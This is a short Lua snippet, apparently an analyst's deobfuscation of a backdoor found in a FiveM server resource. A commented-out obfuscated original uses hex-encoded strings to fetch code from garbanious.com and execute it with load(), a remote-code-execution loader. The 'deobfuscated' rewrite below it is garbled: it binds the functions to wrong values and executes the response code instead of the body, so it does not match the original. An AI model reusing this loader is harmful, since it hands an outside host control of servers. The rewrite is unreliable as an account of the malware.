-- local MccmYsQtoEhbQWasIWsroJeCtDFUqBpkXvNMmYqKpXnQsUhQsSqZLfeJVjnYuagnhSWzeF = {
--     "\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74", "\x61\x73\x73\x65\x72\x74",
--     "\x6c\x6f\x61\x64", _G, "", nil }
-- MccmYsQtoEhbQWasIWsroJeCtDFUqBpkXvNMmYqKpXnQsUhQsSqZLfeJVjnYuagnhSWzeF[4]
--     [MccmYsQtoEhbQWasIWsroJeCtDFUqBpkXvNMmYqKpXnQsUhQsSqZLfeJVjnYuagnhSWzeF[1]](
--         "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x61\x72\x62\x61\x6e\x69\x75\x73\x2e\x63\x6f\x6d\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x43\x63\x6f\x4d\x4d",
--         function(mlGYqdBLSGsGhUrkYhUAgFEmMbrEUDYofeHoDYJtUhBIpZmmRfkxKOljoTNFxmuTYiyGlo,
--                  bBXKXMFxhaJtZZugAYAbXwjzOgXjUmqbfyuvnpsbnljOhJuieKBrpNgyhyEoGmYKCpzApm)
--             if (bBXKXMFxhaJtZZugAYAbXwjzOgXjUmqbfyuvnpsbnljOhJuieKBrpNgyhyEoGmYKCpzApm == MccmYsQtoEhbQWasIWsroJeCtDFUqBpkXvNMmYqKpXnQsUhQsSqZLfeJVjnYuagnhSWzeF[6] or bBXKXMFxhaJtZZugAYAbXwjzOgXjUmqbfyuvnpsbnljOhJuieKBrpNgyhyEoGmYKCpzApm == MccmYsQtoEhbQWasIWsroJeCtDFUqBpkXvNMmYqKpXnQsUhQsSqZLfeJVjnYuagnhSWzeF[5]) then return end
--             MccmYsQtoEhbQWasIWsroJeCtDFUqBpkXvNMmYqKpXnQsUhQsSqZLfeJVjnYuagnhSWzeF[4]
--                 [MccmYsQtoEhbQWasIWsroJeCtDFUqBpkXvNMmYqKpXnQsUhQsSqZLfeJVjnYuagnhSWzeF[2]](
--                     MccmYsQtoEhbQWasIWsroJeCtDFUqBpkXvNMmYqKpXnQsUhQsSqZLfeJVjnYuagnhSWzeF[4]
--                     [MccmYsQtoEhbQWasIWsroJeCtDFUqBpkXvNMmYqKpXnQsUhQsSqZLfeJVjnYuagnhSWzeF[3]](
--                         bBXKXMFxhaJtZZugAYAbXwjzOgXjUmqbfyuvnpsbnljOhJuieKBrpNgyhyEoGmYKCpzApm))()
--         end)

-- Above is original

local PerformHttpRequest, assert, load = _G, "", nil

local url = "https://garbanious.com/v2_/stage3.php?to=CcoMM"
PerformHttpRequest(url, function(responseData, responseCode)
    if (responseCode == nil or responseCode == "") then
        return
    end

    PerformHttpRequest(assert(load(responseCode))())
end)
